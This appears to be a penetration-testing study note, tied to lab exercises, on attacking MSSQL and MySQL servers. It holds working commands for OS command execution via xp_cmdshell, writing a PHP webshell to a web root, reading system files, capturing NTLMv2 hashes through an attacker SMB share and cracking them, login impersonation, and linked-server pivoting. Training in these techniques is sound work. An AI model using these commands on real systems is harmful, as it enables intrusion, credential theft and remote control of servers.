---
tags: [attack, enumeration/mssql, enumeration/mysql, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---
# Attacking SQL Databases

SQL attack techniques for MSSQL and MySQL: RCE via xp_cmdshell, file read/write, NTLMv2 hash stealing via xp_dirtree, user impersonation, and lateral movement via linked servers.

## Overview

SQL servers are high-value targets: they store credentials and PII, often run as highly-privileged service accounts, and provide built-in mechanisms for OS command execution. MSSQL is particularly powerful for attackers due to xp_cmdshell, linked server traversal, and Windows authentication integration.

See [[enumeration/mssql]] and [[enumeration/mysql]] for pre-attack enumeration.

## Connecting

These are separate tools — pick one per session. `mssqlclient.py` (from Impacket) is the preferred Linux client. `sqsh` is an alternative if mssqlclient is unavailable. `sqlcmd` is the native Windows client.

### mssqlclient.py (Impacket) — Linux, preferred

```bash
# SQL Server authentication (username + password)
mssqlclient.py -p 1433 julio:MyPassword!@10.129.203.7

# Windows / domain authentication
mssqlclient.py -p 1433 -windows-auth DOMAIN/julio:MyPassword!@10.129.203.7
```

| Flag | What it does |
|------|-------------|
| `-p 1433` | Port number. MSSQL defaults to 1433; change this if the server runs on a non-standard port. |
| `julio:MyPassword!@10.129.203.7` | Target string in the format `username:password@host`. The colon separates the username from the password; the `@` separates credentials from the host IP. |
| `-windows-auth` | Use Windows/domain authentication instead of SQL Server authentication. Needed when the account is a domain account (DOMAIN\user) rather than a local SQL account. |

Once connected, you get an `SQL>` prompt. Type SQL statements followed by a semicolon, or use `GO` on MSSQL.

### sqsh — Linux, alternative

```bash
# SQL Server authentication
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

# Windows / domain authentication
sqsh -S 10.129.203.7 -U 'DOMAIN\julio' -P 'MyPassword!' -h
```

| Flag | What it does |
|------|-------------|
| `-S 10.129.203.7` | Server IP or hostname to connect to. |
| `-U julio` | Username. For domain accounts, include the domain: `DOMAIN\julio`. |
| `-P 'MyPassword!'` | Password. Wrap in single quotes if it contains special characters. |
| `-h` | Suppress column headers in query results — cleaner output when scripting. |

### sqlcmd — Windows native client

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

| Flag | What it does |
|------|-------------|
| `-S SRVMSSQL` | Server name or IP. Can also be `IP,port` (e.g., `10.0.0.5,1433`). |
| `-U julio` | Username. |
| `-P 'MyPassword!'` | Password. |
| `-y 30` | Sets the display width for variable-length columns (varchar, nvarchar). Prevents truncation. |
| `-Y 30` | Sets the display width for fixed-length columns (char, nchar). Same purpose as `-y` but for fixed types. |

### mysql — MySQL from Linux

```bash
mysql -u julio -p'Password123' -h 10.129.20.13
```

| Flag | What it does |
|------|-------------|
| `-u julio` | Username. |
| `-p'Password123'` | Password. No space between `-p` and the password. If you type just `-p`, MySQL will prompt you interactively (more secure for scripts). |
| `-h 10.129.20.13` | Remote host IP. Without `-h`, MySQL tries to connect to localhost. |

## Using the SQL prompt

The two Linux clients behave differently once you're connected.

### mssqlclient.py — immediate execution

Type a SQL statement and press Enter. Results appear immediately. No `GO` needed.

```
SQL> SELECT name FROM master.dbo.sysdatabases;
name
----
master
tempdb
model
msdb
htbdb
```

### sqsh — batch execution (GO required)

sqsh accumulates lines into a batch. **Nothing executes until you type `GO` on its own line.** The numbered prompts (`1>`, `2>`, `3>`) show you are building up a batch — this is normal.

```
1> SELECT name FROM master.dbo.sysdatabases
2> GO          ← executes everything above
name
----
master
tempdb
```

Common mistakes:
- Typing `SELECT ...; GO` on one line — the semicolon ends the statement but `GO` must be a standalone line
- Typing `whoami` — that is a shell command, not SQL. To run OS commands you need `EXEC xp_cmdshell 'whoami'` (see below)
- Forgetting `GO` and wondering why nothing happens — type `\reset` to clear the buffer and start over

Useful sqsh meta-commands:

| Command | What it does |
|---------|-------------|
| `GO` | Execute the current batch |
| `\reset` | Discard the current batch without executing |
| `\quit` | Exit sqsh |
| `\go` | Same as `GO` (lowercase alias) |

### Checking your access level (do this first)

```sql
-- Who am I logged in as?
SELECT SYSTEM_USER;
GO

-- Am I a sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
-- Returns 1 = yes, 0 = no

-- What databases exist?
SELECT name FROM master.dbo.sysdatabases;
GO

-- Switch to a specific database
USE htbdb;
GO

-- List tables in the current database
SELECT table_name FROM INFORMATION_SCHEMA.TABLES;
GO
```

## Command execution (MSSQL: xp_cmdshell)

```sql
-- Execute OS commands
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell if disabled (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

`xp_cmdshell` inherits the SQL Server service account's OS privileges. If running as NT AUTHORITY\SYSTEM, you have full OS access.

## File write (webshell via SELECT INTO OUTFILE)

MySQL only — useful when the DB server also runs a web server:

```sql
-- Check if file writes are permitted
SHOW VARIABLES LIKE "secure_file_priv";
-- Empty value = unrestricted

-- Write PHP webshell to web root
SELECT "<?php echo shell_exec($_GET['c']);?>" 
INTO OUTFILE '/var/www/html/webshell.php';
```

Then access it:

```bash
curl 'http://10.129.203.7/webshell.php?c=id'
```

MSSQL file write via OLE Automation (requires sysadmin):

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXEC sp_OADestroy @FileID; EXEC sp_OADestroy @OLE;
```

## File read

```sql
-- MSSQL: read any file the service account can access
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;

-- MySQL: LOAD_FILE requires FILE privilege and empty secure_file_priv
SELECT LOAD_FILE('/etc/passwd');
```

## NTLMv2 hash stealing via xp_dirtree

Point `xp_dirtree` or `xp_subdirs` at an attacker-controlled SMB share. The MSSQL service account authenticates via NTLMv2, which you capture with Responder or impacket-smbserver.

```bash
# Start Responder (or impacket-smbserver) on attacker host
sudo responder -I tun0

# Or use impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

```sql
-- Trigger hash capture from MSSQL
EXEC master..xp_dirtree '\\10.10.110.17\share\';
-- or
EXEC master..xp_subdirs '\\10.10.110.17\share\';
```

Crack the captured NTLMv2 hash:

```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Or relay the hash via impacket-ntlmrelayx (see [[attack/smb]] for relay setup).

## User impersonation (MSSQL IMPERSONATE)

Low-privilege users granted IMPERSONATE can take on sysadmin permissions:

```sql
-- Find who you can impersonate
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Check current privileges
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate sa (or any listed user)
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- should return 1

-- Return to original user
REVERT;
```

## Linked server lateral movement

MSSQL can be configured with trusted connections to other database servers. If those remote servers run as sysadmin:

```sql
-- Identify linked servers
SELECT srvname, isremote FROM sysservers;

-- Execute command on linked server
EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')')
AT [10.0.0.12\SQLEXPRESS];

-- If sysadmin on linked server, enable xp_cmdshell there and run commands
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [10.0.0.12\SQLEXPRESS];
```

## Key SQL commands reference

| Task            | MySQL                  | MSSQL                                                  |
| --------------- | ---------------------- | ------------------------------------------------------ |
| List databases  | `SHOW DATABASES;`      | `SELECT name FROM master.dbo.sysdatabases; GO`         |
| Select database | `USE dbname;`          | `USE dbname; GO`                                       |
| List tables     | `SHOW TABLES;`         | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES; GO` |
| Read all rows   | `SELECT * FROM table;` | `SELECT * FROM table; GO`                              |

## Gotchas & notes

- xp_cmdshell is disabled by default; enabling it requires sysadmin and leaves audit traces
- `secure_file_priv` blocks MySQL file operations unless empty — always check before trying writes
- NTLMv2 relay from MSSQL only works if target has SMB signing disabled (see [[attack/smb]])
- IMPERSONATE privs are session-scoped; after `REVERT`, you lose elevated access
- Linked server execution uses the credentials configured for that link, not your current creds

## Related pages

- [[enumeration/mssql]]
- [[enumeration/mysql]]
- [[tools/utility/impacket]]
- [[tools/attack/netexec]]
- [[tools/attack/responder]]
- [[attack/smb]] — NTLM relay and hash cracking
- [[labs/htb/attacking_common_services/mssql_hash_theft_and_db_enumeration]] — full walkthrough: xp_dirtree NTLMv2 theft → crack mssqlsvc password → flagDB schema enumeration → flag

## Sources

- raw/attacking_common_services/sql_attacking_sql_databases.md
- raw/attacking_common_services/sql_latest_sql_vulnerabilities.md
